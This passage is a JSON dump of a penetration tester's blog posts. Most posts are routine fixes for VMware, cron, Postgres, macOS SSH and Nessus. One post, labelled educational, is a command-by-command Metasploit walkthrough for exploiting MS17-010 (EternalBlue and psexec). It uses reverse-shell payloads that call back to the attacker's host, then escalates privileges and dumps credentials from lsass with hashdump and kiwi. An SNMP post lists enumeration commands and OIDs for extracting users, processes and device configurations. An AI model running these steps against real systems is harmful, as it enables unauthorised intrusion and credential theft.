src=\"/static/e1ff1309-bdda-4c13-ba0f-bdaef6f9f371.png\" class=\"img-fluid\" alt=\"Remove the BlackWidows.vmdk file from explorer\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Remove the BlackWidows.vmdk file from explorer.</figcaption>\n</figure>\n\n\n\n\nNext we use the Virtual Disk Manager to rename the old hardrive and place it in the new location. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"> \n<img src=\"/static/727b3493-64b1-4206-b5df-4e4fa84ddb90.png\" class=\"img-fluid\" alt=\"Using the vmware-vdiskmanager.exe to rename and move old machines vmdk\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Using the vmware-vdiskmanager.exe to rename and move old machines vmdk.</figcaption>\n</figure>\n\n\n> Note: This will move the hard drive from the original folder. You might want to make a copy. \n\nNow all is left is to attach the hard drive. \n\nGot to settings `CTRL` + `D` and click \"Add\". Select Hard Disk.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"> \n<img src=\"/static/ec12321f-6996-4673-a974-11eccd2a86c1.png\" class=\"img-fluid\" alt=\"Add Hardware Wizard - Select Hard Disck and Click Next\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Add Hardware Wizard - Select Hard Disck and Click Next.</figcaption>\n</figure>\n\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"> \n<img src=\"/static/6800f692-e604-40a1-8a06-bbdee9ff7904.png\" class=\"img-fluid\" alt=\"Add Hardware Wizard - Select Use an existing vitural disk\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Add Hardware Wizard - Select Use an existing vitural disk.</figcaption>\n</figure>\n\n\n\nChoose \"Use an existing virtual disk\". \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"> \n<img src=\"/static/81aedfc6-cd7f-48b5-bf5f-e42774157a6c.png\" class=\"img-fluid\" alt=\"Add Hardware Wizard - Select Use an existing vitural disk\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Add Hardware Wizard - Select Use an existing vitural disk.</figcaption>\n</figure>\n\n\nSelect the disk you just created and click \"Finish\" \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"> \n<img src=\"/static/996e9216-5c62-4fd9-9da4-cf27af2d52eb.png\" class=\"img-fluid\" alt=\"Add Hardware Wizard - Browser to newly created BlackWidow.vmdk\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Add Hardware Wizard - Browser to newly created BlackWidow.vmdk.</figcaption>\n</figure>\n\n\nYou can now delete the old folder that contained your machine Hard Disk and boot your new machine up."},{"fields":{"slug":"/i-must-learn-to-check-status-docker-com"},"excerpt":null,"frontmatter":{"date":"14th April 2021 ","title":"I must learn to check status.docker.com","description":"","tags":"docker","posttype":"blog"},"body":"\n<h1>Lesson Learnt</h1>\n\nAfter a night of complaining to myself about the poor performance of `Docker pull` on a VPS I have hosted in Asia, I just stumbled onto the \n\n[https://status.docker.com/](https://status.docker.com/https://status.docker.com/pages/history/533c6539221ae15e3f000031) website. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/29cc5fe3-48a6-443a-9e9e-fe96fcb2072c.png\" class=\"img-fluid\" alt=\"Current system status of Docker where you can view active incidents or upcoming maintenances.\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">Current system status of Docker where you can view active incidents or upcoming maintenances.</figcaption>\n</figure>"},{"fields":{"slug":"/appending-dates-to-filenames-in-cron-jobs"},"excerpt":null,"frontmatter":{"date":"29th March 2021 ","title":"Appending Dates To Filenames in Cron Jobs","description":"","tags":null,"posttype":"blog"},"body":"As a heavy proponent of automation, I constantly use `cron` to schedule tasks. A `cron` is a utility available in Linux that allows you to schedule a command or script to run automatically at a specified time and date. A ___cron job___ is the name for the scheduled task.\n\nSome of the tasks I set up ___cron jobs___ for are deleting temporary files, running commands, synchronise data folders and tasks that email me updates based on various gathered pieces of data. \n\nI plan to do a full article on the `cron` service in the future, but for now, I wanted to cover a recent gotcha I got asked for input into solving. \n\n### How do I append dates to filenames in cron jobs. \n\nSo it is quite common to want to append dates in filenames. We have probably all seen a script such as\n\n```\n:::bash\n#!/bin/bash\n\ntar -cf backup-$(date +%Y-%m-%d-%H%M%S).tar file1.txt file2.txt\n```\n\nThose who don't know [what the `tar` command does](https://linux.die.net/man/1/tar). \n\n> A quick tip - while I don't want to get away from the point of this article, but if you didn't require the hour, minutes and seconds, then we can modify the previous command; using backticks instead of `$()` and using the `date -I` syntax, less typing. See the example below.\n\nThe image below shows a file listing using the  `ls -l` command. The image shows two files called file1.txt and file2.txt, respectively. Using the `tar` and `date` commands, we make a `tar` archive of the two files appended with the date and time at the end of the archive name. \n\nWe then show the listing again, and we can see the creation of `backup-2021-03-27-152146.tar`. Next, we see a variation of command being run using just the `date -I` enclosed in backticks. The output of this does not show the hours, minutes and seconds; however, it is faster to type and has another benefit we will see in a minute.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/63778ef4-da31-464f-8748-397463b45a49.png\" class=\"img-fluid\" alt=\"Appending Dates To Filenames in Cron Jobs\">\n <figcaption class=\"figure-caption text-center fw-normal text-dark\">Appending Dates To Filenames in Cron Jobs.</figcaption>\n</figure>\n\nWe have seen a typical use case of a command that appends the date. Why can't I use this in a cron? Surely we can paste the above example in a script called _mybackupscript.sh_ and run it every minute like the following... right!\n\n```\n:::bash\n# Example of job definition:\n# .---------------- minute (0 - 59)\n# |  .------------- hour (0 - 23)\n# |  |  .---------- day of month (1 - 31)\n# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...\n# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\n# |  |  |  |  |\n# *  *  *  *  * user-name  command to be executed\n*/1  *  *  *  * root /root/mybackupscript.sh\n```\n\n**Wrong** - We can read the manual for the crontab `man 5 crontab` to get our answer.\n\n> The \"sixth\" field (the rest of the line) specifies the command to be run. The entire command portion of the line, up to a newline or a \"%\" character, will be executed by /bin/sh or by the shell specified in the SHELL variable of the cronfile. A \"%\" character in the command, unless escaped with a backslash (\\), will be changed into newline characters, and all data after the first % will be sent to the command as standard input.\n\nSo how do we work around this? \n\nJust as the excerpt says, we escape like so\n\n```\n:::bash\n#!/bin/bash\n\ntar -cf backup-$(date +\\%Y-\\%m-\\%d-\\%H\\%M\\%S).tar file1.txt file2.txt\n```\n\nSo, Saint? Why did you waste time showing us `date -I`.... because it doesn't contain a percentage sign ;-)."},{"fields":{"slug":"/remote-exploit-ms-17-010"},"excerpt":"This article demonstrates how to exploit the MS17-010 vulnerability with the Metasploit Framework. This article is for educational purposes…","frontmatter":{"date":"27th March 2021 ","title":"Remote Exploit MS17-010","description":"This article serves as a quick reference to exploiting the MS17-010 with the Metasploit Framework. This article is for educational purposes only.","tags":"kali-linux, metasploit, ms17-010, windows","posttype":"article"},"body":"This article demonstrates how to exploit the MS17-010 vulnerability with the `Metasploit Framework`. This article is for educational purposes only.\n\nTwo methods are demonstrated; `with` and `without compromised credentials`. This article does not discuss the vulnerability and its background.\n\n# Method 1 - MS17-010 exploitation without credentials: EternalBlue\n\n<h5 class=\"step\">Step 1 - Launch Metasploit and choose the `ms17_010_eternalblue` exploit</h5>\n\n```\nmsfconole\n[...]\nuse exploit/windows/smb/ms17_010_eternalblue\n```\n\n<h5 class=\"step\">Step 2 - Configure options for your target</h5>\n\nConfigure your exploit to run with options that are specific to your target. Note that setting the remote port is optional, this is 445 by default\n\n```\nshow targets\nset TARGET <id>\nset RHOST <target IP>\nset RPORT <target port> (445 by default)\n```\n\n<h5 class=\"step\">Step 3 - Configure options for your machine</h5>\n\nConfigure options for your machine with. \n\n```\nset LHOST <your IP>\nset LPORT <port of your choice>\n```\n\n<h5 class=\"step\">Step 4 - Optional: Configure a payload</h5>\n\nThis step is optional. By default, `windows/x64/meterpreter/reverse_tcp` is used.\n\n```\nshow PAYLOADS\n```\n\nChoose and set a payload with:\n\n```\nset PAYLOAD <payload>\n```\n\n<h5 class=\"step\">Step 5 - Exploit</h5>\n\nTo run the exploit use:\n\n```\nexploit\n```\n\nA reverse connection is initiated upon successful exploitation.\n\nFor `post-exploitation tips`, see step 6 of the below instructions.\n\n# MS17-010 Exploitation - With credentials: PSExec\n\nThis example requires credentials to run. This example is done using a domain-joined target.\n\n<h5 class=\"step\">Step 1 - Launch Metasploit and choose the `ms17_010_psexec` exploit</h5>\n\n```\nmsfconole\n[...]\nuse exploit/windows/smb/ms17_010_psexec\n```\n\n<h5 class=\"step\">Step 2 - Configure options for your target</h5>\n\nConfigure your exploit to run with options that are specific to your target. Note that setting the remote port is optional, this is 445 by default\n\n```\nshow TARGETS\nset TARGET <id>\nset RHOST <target IP>\nset RPORT <target port> (445 by default)\nset SMBUSER <user>\nset SMBPASS <password>\nset SMBDOMAIN <domain>\n```\n\n<h5 class=\"step\">Step 3 - Configure options for your machine</h5>\n\n```\nset LHOST <your IP>\nset LPORT <port of your choice>\n```\n\n<h5 class=\"step\">Step 4 - Optional: Configure a payload</h5>\n\nThis step is optional. By default, `windows/x64/meterpreter/reverse_tcp` is used.\n\n```\nshow PAYLOADS\n```\n\nChoose and set a payload with:\n\n```\nset PAYLOAD <payload>\n```\n\nFor example, to use a smaller `bind` payload (`stageless`), you can choose:\n\n```\nset PAYLOAD generic/shell_bind_tcp\n```\n\n<h5 class=\"step\">Step 5 - Exploit</h5>\n\nTo run the exploit use:\n\n```\nexploit\n```\n\n<h5 class=\"step\">Step 6 - Optional: Post-Exploitation</h5>\n\nIf you used a non-meterpreter payload, you can upgrade it to Meterpreter using:\n\n```\nCTRL + Z (background session)\nuse post/multi/manage/shell_to_meterpreter\nsessions -l\nset session <session id>\nset LHOST <your IP>\nset LPORT <port of your choice>\nexploit\n```\n\n<b>Note:</b> You may need to run this a few times to upgrade the shell.\n\nOnce you have upgraded your shell, you can escalate your privileges.\n\n```\nsession -i <meterpreter session>\ngetsystem\n```\n\nTo migrate process and dump credentials, use:\n\n```\nps\nmigrate -N lsass.exe\nhashdump\nload kiwi\ncreds_all\n```"},{"fields":{"slug":"/v-mware-workstation-cannot-connect-to-the-virtual-machine"},"excerpt":null,"frontmatter":{"date":"23rd March 2021 ","title":"VMware Workstation cannot connect to the virtual machine","description":"","tags":"vmware, building-labs","posttype":"blog"},"body":"\nHave you ever had this error when trying to start a Virtual Machine?? \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/f6bf486c-d485-4ce9-90ab-9edd74ab6198.png\" class=\"img-fluid\" alt=\"VMware Workstation cannot connect to the virtual machine.\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">VMware Workstation cannot connect to the virtual machine.</figcaption>\n</figure>\n\nLet me start this article by saying I love VMware! Like most hackers and penetration testers, I spend most of my day working in various Virtual Machines (VMs). Over time you get to see lots of errors and quirky bugs, and you learn how to fix these issues. Quite often, a colleague will send me a screenshot over the internal comms, asking if I know how to fix a particular issue. To reduce support time and share the wealth with my readers, I have decided that each time I encounter one of these from now on, I will document the fix.  \n\n## The Error\n\n>VMware Workstation cannot connect to the virtual machine. Make sure you have the right to run the program, access all directories the program uses, and access all directories for temporary files. \n\n>The VMware Authorization Service is not running. \n\n## How to fix this?\n\n<h5 class=\"step\">Step 1)</h5> \n\nRight-click on the taskbar and select task manager. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/a0884e80-3f2f-4f17-9a2e-a2df961785f8.png\" class=\"img-fluid\" alt=\"Go to taskmanager.\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">Go to taskmanager.</figcaption>\n</figure>\n\n<h5 class=\"step\">Step 2)</h5>\n\n Kill off any VMware Processes \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/4f8d486c-33e4-4692-971f-b65d512dad23.png\" class=\"img-fluid\" alt=\"Kill VMware Processes.\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">Kill VMware Processes.</figcaption>\n</figure>\n\n<h5 class=\"step\">Step 3)</h5>\n\nPress `Win` + `R` and type in `services.msc`\n\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/69ee42d4-29b7-410c-8537-532364f6f64d.png\" class=\"img-fluid\" alt=\"Open Up Services.msc.\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">Open Up Services.msc.</figcaption>\n</figure>\n\n<h5 class=\"step\">Step 4)</h5>\n\nStart the \"VMware Authorization Service\"\n\nAll done! You should now be able to login into your Virtual Machin! \n\nIf these steps do not work for you or you encounter a different problem, then please leave a comment. Also, leave a comment if you have a better workaround or you have found a different solution."},{"fields":{"slug":"/auditing-juniper-network-devices"},"excerpt":"Lack of Console Connection Timeout It is possible for a console connection to become unused without being terminated, for example by an…","frontmatter":{"date":"22nd March 2021 ","title":"Auditing Juniper Network Devices","description":"This article describes some of the querks of auditing Juniper network devices","tags":"auditing, console-connection, juniper","posttype":"article"},"body":"\n## Lack of Console Connection Timeout\n\nIt is possible for a console connection to become unused without being terminated, for example by an administrator forgetting to terminate the connection. When this happens, it is possible that an attacker could gain access to the authenticated session (either by gaining physical access or, in the case of less secure network protocols, remotely) and thus gain administrative access.\nIn order to avoid this, the usual best practice is to set a timeout, so connections terminate within a specified time if no actions are taken. \n\nTo check the current timeout sessions you can run the following command\n```\nget console\n```\n\nOr\n```\nshow cli\n```\n\n\nTo set the timeout\n```\nset console timeout <time in minutes>\n```\n\nCommand introduced before Junos OS Release 7.4.\n```\nset cli idle-timeout <minutes>\n```\n\n## Tacacs+\n\nLook for a missing TACACS+ encryption key. If one is not configured on the Juniper device then this configuration may affect the confidentiality of TACACS+ encrypted traffic, as an attacker may be able to intercept it without a password requirement.\n\nAuthentication requests are sent by the Terminal Access Controller Access Control System Plus (TACACS+) server, using TCP/49, and an access response is returned. A TACACS+ encryption key can be configured on both the client and server in order to encrypt and help protect the traffic. Although TACACS+ is considerably more secure than TACACS, a number of security issues exist with the protocol, such as:\n\n* TACACS+ is vulnerable to replay attacks.\n* TACACS+ encrypted packets leak information about the authentication credentials.\n* Weaknesses exist within the TACACS+ encryption.\n\nIn order to address the last of these issues, a strong encryption key should be configured. However, if the key is leaked in plain text by another service an attacker could decrypt the authentication attempt, no matter how strong the encryption may be."},{"fields":{"slug":"/beginners-guide-to-pentesting-azure"},"excerpt":null,"frontmatter":{"date":"22nd March 2021 ","title":"Beginners Guide To Pentesting Azure","description":"This article serves as an introduction to Azure penetration testing.","tags":"azure, connect, cryptography","posttype":"article"},"body":"# Beginners Guide To Pentesting Azure\n\nLet us start by installing the Azure Active Directory PowerShell Modules.\n\n```\nInstall-Module AzureAD\n```\n\n<img src=\"/static/fc3f3cf0-9981-42f0-8a46-62d1a50b6286.png\" class=\"img-fluid\" alt=\"Beginners Guide To Pentesting Azure\">\n\nWith the module installed we can now run the following from the command line to list all the available commands. \n\n```\nget-command -Module AzureAD\n```\n\nIf we look down the list we can see a command for connecting to Azure \n\n<img src=\"/static/c3a9c547-7ef9-4f8d-8e5c-fd81d074a561.png\" class=\"img-fluid\" alt=\"Connecting to Azure\">\n\n```\nConnect-AzureAD\n```\n\nA pop-up should appear asking you to authenticate \n\n<img src=\"/static/05931e0d-0154-4591-99fd-5a11d6d3f6e7.png\" class=\"img-fluid\" alt=\"\">\n\n\nIf you get the following error after trying to connect then you are possibly using PowerShell Core. \n\n`Connect-AzureAD: One or more errors occurred. (Could not load type 'System.Security.Cryptography.SHA256Cng' from assembly 'System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'.): Could not load type 'System.Security.Cryptography.SHA256Cng' from assembly 'System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'.\nConnect-AzureAD: One or more errors occurred. (Could not load type 'System.Security.Cryptography.SHA256Cng' from assembly 'System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'.)\nConnect-AzureAD: Could not load type 'System.Security.Cryptography.SHA256Cng' from assembly 'System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'.\nConnect-AzureAD: One or more errors occurred. (Could not load type 'System.Security.Cryptography.SHA256Cng' from assembly 'System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'.): Could not load type 'System.Security.Cryptography.SHA256Cng' from assembly 'System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'.`\n\n\nIf you are able to successfully connect you will see a returned table showing your:\n\n* Account\n* Environment, \n* Tenant ID\n* Tenant Domain\n* Account Type\n\nWhat if you want to run cmdlets against a different Tennant. \n\n```\nConnect-AzureAD -Tenant <Tenant ID>\n```\n\nWhere can I find the Tenant ID I hear you say?\n\n### Getting the Tenant ID Via The Portal\n\n<img src=\"/static/75cd2d95-b2cc-442f-a519-60f59b371c5d.png\" class=\"img-fluid\" alt=\"\">\n\n<img src=\"/static/3ec7c6d8-e478-47a1-9acd-9bf7b3ab6548.png\" class=\"img-fluid\" alt=\"\">"},{"fields":{"slug":"/error-dumping-postgres-database"},"excerpt":null,"frontmatter":{"date":"21st March 2021 ","title":"Error Dumping Postgres Database","description":"","tags":"postgres","posttype":"blog"},"body":"\nWhen dumping database\n```\nsudo -u postgres pg_dump database-name  > dump.sql\n```\n\nYou get an error that looks like \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/532719ab-7409-4371-9037-be1ce0637a23.png\" class=\"img-fluid\" alt=\"perl: warning: Falling back to the standard locale ('c')\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">perl: warning: Falling back to the standard locale ('c').</figcaption>\n</figure>\n\n\nThe fix\n\n```\ndpkg-reconfigure locales\n```\n\nFor completeness, we should also talk about importing a database \n```\nsu postgres\npsql -U postgres  database-name  > dump.sql\n```"},{"fields":{"slug":"/hostnames-for-setting-up-labs"},"excerpt":"When setting up a pentest lab, one of the most important decisions you need to make is choosing a scheme for your machine names. The below…","frontmatter":{"date":"21st March 2021 ","title":"Hostnames For Setting Up Labs","description":"","tags":null,"posttype":"blog"},"body":"\nWhen setting up a pentest lab, one of the most important decisions you need to make is choosing a scheme for your machine names. \n\nThe below resource is something I often use when setting up new labs. \n\nYou can get ideas ranging from mythology, stars, planets and Greek Gods to the Seven Deadly Sins and the book of Mormon. Check it out next time you need ideas for a naming scheme. \n\n[namingschemes.com](https://namingschemes.com/)"},{"fields":{"slug":"/remote-ssh-access-tutorial"},"excerpt":"Remotely accessing Secure Shell (SSH) Services Generating a New Public Key\n\nssh-keygen -y -f ~/.ssh/id_rsa > ~/.ssh/id_rsa.pub\n\n\n=============…","frontmatter":{"date":"21st March 2021 ","title":"Remote SSH Access tutorial","description":"","tags":"ssh","posttype":"tutorial"},"body":"Remotely accessing Secure Shell (SSH) Services\n\nGenerating a New Public Key\n```\nssh-keygen -y -f ~/.ssh/id_rsa > ~/.ssh/id_rsa.pub\n```\n=========================================== \n\n\nhttps://www.ssh.com/ssh/passphrase"},{"fields":{"slug":"/enable-ssh-mac-os-x"},"excerpt":null,"frontmatter":{"date":"17th March 2021 ","title":"Enable SSH Mac OS X","description":"","tags":"ssh, macosx","posttype":"blog"},"body":"<h5 class=\"step\">Step 1</h5>\n\nClick on the system preferences icon\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/b7fba445-87aa-450b-a4b9-5486714ffecd.png\" class=\"img-fluid\" alt=\"System Preferences Icon.\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\n<h5 class=\"step\">Step 2</h5>\n\nYou will be presented with the system preferences panel. Click \"Sharing\".\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/cb0736ee-d53a-4348-b3a0-e5555417c15b.png\" class=\"img-fluid\" alt=\"System Preferences Control Panel.\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences Control Panel.</figcaption>\n</figure>\n\n<h5 class=\"step\">Step 3</h5>\n\nOn the left-hand navigation menu, make sure \"remote login\" is checked.\n\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/a33bfe22-bcff-4c2e-9dd1-5510f66b436d.png\" class=\"img-fluid\" alt=\"Sharing Settings.\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">Sharing Settings.</figcaption>\n</figure>\n\n<h5 class=\"step\">Step 4</h5>\n\nClick the plus icon as indicated by the arrow in the screenshot. From here we can add individual system users and provide them access. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/41f0deee-891a-4d12-9d10-398cf563f34d.png\" class=\"img-fluid\" alt=\"Adding Users To Share Settings Configuration.\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">Adding Users To Share Settings Configuration.</figcaption>\n</figure>\n\n<h5 class=\"step\">Step 5</h5>\n\nAlternatively, if you wish to give access to everyone on the system you can select the radio control next to the label \"Allow access for:\" and select \"All users\" to enable remote login for all users\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/ffa6af59-b53a-4698-8c0a-a90d94eb409d.png\" class=\"img-fluid\" alt=\"Allow Access For All Users.\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">Allow Access For All Users.</figcaption>\n</figure>"},{"fields":{"slug":"/resetting-the-nessus-password-on-kali-linux-or-parrot-os"},"excerpt":null,"frontmatter":{"date":"17th March 2021 ","title":"Resetting The Nessus Password On Kali Linux Or Parrot OS","description":"","tags":"nessus","posttype":"blog"},"body":"\nHave you ever returned to your Nessus to realise you have forgotten your password or just forgotten the user name?\n\nYou are not alone, this happens to the best of us. \n\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/83bea23c-9bda-44b3-9a3f-2cc19ee69db1.png\" class=\"img-fluid\" alt=\"What is my password\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">What is my password.</figcaption>\n</figure>\n\n\nNessus is the world’s most popular vulnerability assessment tool. It is an open-source vulnerability scanner although there is also a commercial option. option Open a terminal and type the command `cd /opt/nessus/sbin` to navigate to the `sbin` directory. Here type `ls`  to see the contents of this directory as shown below.\n\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/b714d822-e088-431c-adac-830ff4f63679.png\" class=\"img-fluid\" alt=\"Nessus Directory\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">Nessus Directory.</figcaption>\n</figure>\n\n\nIf you can't remember the user name then you can just run the following command `./nessuscli lsuser` to see all the Nessus users configured. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/51cf2c23-aebf-4526-a67c-7878c9aaf0db.png\" class=\"img-fluid\" alt=\"Listing Users\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">Listing Users.</figcaption>\n</figure>\n\nHere, we have only one. Let us reset the 'evilsaint' user! \n\nType command ` ./nessuscli chpasswd evilsaint`. The system will prompt you to enter the new password. Enter the password two times as shown below. You have successfully reset your Nessus password. Now login with the new password.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/1ace8c68-2700-4242-ba14-a130df2ca3a6.png\" class=\"img-fluid\" alt=\"Changing the password\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">Changing the password.</figcaption>\n</figure>"},{"fields":{"slug":"/simple-network-management-protocol-snmp-introduction"},"excerpt":"SNMP stands for Simple Network Management Protocol. It is generally used by network monitoring applications to read and write network state…","frontmatter":{"date":"19th January 2021 ","title":"Simple Network Management Protocol (SNMP) :- Introduction","description":"","tags":"snmp, snmpwalk, community-string","posttype":"tutorial"},"body":"SNMP stands for Simple Network Management Protocol. It is generally used by network monitoring applications to read and write network state variables\n(state of the interface, no. of sent packets etc.). Types of managed devices include servers, workstations and network devices.  \n  \nSNMP services run by default on the 161 UDP port.  \n  \nSNMP communications are generally protected by using an authentication string called community string. There are two types of community strings, a read-only\ncommunity string that gives us access to the general variables of the network and a read-write one, that also allows us to set specific variables.  \n  \nIf you can \"guess\" the read-only or read-write strings you can obtain quite a bit of access you would not normally have. In addition, if Windows based\ndevices are configured with SNMP, often times with the RO/RW community strings, you can extract patch levels, services running, last reboot times,\nusernames on the system, routes, and various other amounts of information that is valuable to an attacker.  \n  \nIf you can find a Cisco device running a private string for example, you can actually download the entire device configuration, modify it, and upload your\nown malicious config. Often the passwords themselves are level 7 encoded which means they are trivial to decode and obtain the ‘enable‘ or login password for\nthe specific device  \n  \nWhen querying through SNMP, there is what's called an MIB API. The MIB stands for the Management Information Base (MIB). This interface allows you to query\nthe device and extract information.  \n  \n  \nRFC MIB = http://www.oidview.com/mibs/0/HOST-RESOURCES-MIB.html  \n  \nVENDOR SPECIFIC = http://www.oidview.com/mibs/detail.html  \n  \nMICROSOFT = http://www.oidview.com/mibs/311/md-311-1.html  \n  \n```  \n1.3.6.1.2.1.25.1.6.0 System Processes  \n1.3.6.1.2.1.25.4.2.1.2 Running Programs  \n1.3.6.1.2.1.25.4.2.1.4 Processes Path  \n1.3.6.1.2.1.25.2.3.1.4 Storage Units  \n1.3.6.1.2.1.25.6.3.1.2 Software Name  \n1.3.6.1.4.1.77.1.2.25 User Accounts  \n1.3.6.1.2.1.6.13.1.3 TCP Local Ports  \n```\n\n## SNMPWalk\n\nSnmpwalk is a popular tool for testing SNMP. This tool acts as SNMP client, and we can use it for our penetration testing where we require making requests\nto the SNMP service on the target host.  \n  \n### Common Usage\n\nShows Help  \n```  \nsnmpwalk --help\n```  \n\nLooks at one host, specifying a community string of public  \n```  \nsnmpwalk -v 1 -c public 10.11.1.22\n```  \n\nHere we are asking snmpwalk to walk one node subset in the MIB  \n```  \nsnmpwalk -v 1 -c public 10.11.1.22 .1.3.6.1.2.1.25.1.6.0\n```  \n\n`-M` option allows us to include a file of MIB's to look throgh  \n```  \nsnmpwalk -v 1 -c public 10.11.1.22 -M mibs.txt\n```  \n\nSome MIB nodes display in hex, in order to force display of those in ASCI we add the -Oa options  \n```  \nsnmpwalk -v 1 -c public 10.11.1.73 iso.3.6.1.2.1.2.2.1.2 -Oa\n```  \n\nAdding the `n` to the `-O` option means it displays full OID's  \n```  \nsnmpwalk -v 1 -c public 10.11.1.73 iso.3.6.1.2.1.2.2.1.2 -Oan\n```  \n\nSearching snmpwalk for a specific MID string.  \n```  \nfor ip in $(cat out | cut -d\" \" -f1 | sort -u | grep \"10.11\"); do echo $ip ;\nsnmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2 ; done\n```  \n\nFiltering output of a lookup for a specific string  \n```  \nsnmpwalk -v 1 -c public 10.11.1.73 -Oa | grep \"iso.3.6.1.2.1.2.2.1.2\"\n```  \n\n### Important MIB's ID for Pentestesters\n\n#### Windows  \n  \n```\nRUNNING PROCESSES 1.3.6.1.2.1.25.4.2.1.2  \nINSTALLED SOFTWARE 1.3.6.1.2.1.25.6.3.1.2  \nSYSTEM INFO 1.3.6.1.2.1.1.1  \nHOSTNAME 1.3.6.1.2.1.1.5  \nDOMAIN 1.3.6.1.4.1.77.1.4.1  \nUPTIME 1.3.6.1.2.1.1.3  \nUSERS 1.3.6.1.4.1.77.1.2.25  \nSHARES 1.3.6.1.4.1.77.1.2.27  \nDISKS 1.3.6.1.2.1.25.2.3.1.3  \nSERVICES 1.3.6.1.4.1.77.1.2.3.1.1  \nLISTENING TCP PORTS 1.3.6.1.2.1.6.13.1.3.0.0.0.0  \nLISTENING UDP PORTS 1.3.6.1.2.1.7.5.1.2.0.0.0.0  \nSYSTEM PROCESSES 1.3.6.1.2.1.25.1.6.0  \nSTORAGE UNITS 1.3.6.1.2.1.25.2.3.1.4  \n```\n\n#### Linux\n\n```  \nRUNNING PROCESSES 1.3.6.1.2.1.25.4.2.1.2  \nSYSTEM INFO 1.3.6.1.2.1.1.1  \nHOSTNAME 1.3.6.1.2.1.1.5  \nUPTIME 1.3.6.1.2.1.1.3  \nMOUNTPOINTS 1.3.6.1.2.1.25.2.3.1.3  \nRUNNING SOFTWARE PATHS 1.3.6.1.2.1.25.4.2.1.4  \nLISTENING UDP PORTS 1.3.6.1.2.1.7.5.1.2.0.0.0.0  \nLISTENING TCP PORTS 1.3.6.1.2.1.6.13.1.3.0.0.0.0  \nSYSTEM PROCESSES 1.3.6.1.2.1.25.1.6.0  \nSTORAGE UNITS 1.3.6.1.2.1.25.2.3.1.4  \n```\n\n#### Cisco\n\n```\nLAST TERMINAL USERS 1.3.6.1.4.1.9.9.43.1.1.6.1.8  \nINTERFACES 1.3.6.1.2.1.2.2.1.2  \nSYSTEM INFO 1.3.6.1.2.1.1.1  \nHOSTNAME 1.3.6.1.2.1.1.5  \nSNMPcommunities 1.3.6.1.6.3.12.1.3.1.4  \nUPTIME 1.3.6.1.2.1.1.3  \nIP ADDRESSES 1.3.6.1.2.1.4.20.1.1  \nINTERFACE DESCRIPTIONS 1.3.6.1.2.1.31.1.1.1.18  \nHARDWARE 1.3.6.1.2.1.47.1.1.1.1.2  \nTACACS SERVER 1.3.6.1.4.1.9.2.1.5  \nLOGMESSAGES 1.3.6.1.4.1.9.9.41.1.2.3.1.5  \nPROCESSES 1.3.6.1.4.1.9.9.109.1.2.1.1.2  \nSNMP TRAP SERVER 1.3.6.1.6.3.12.1.2.1.7`\n```\n\n## snmp-check\n\n`snmp-check` allows you to 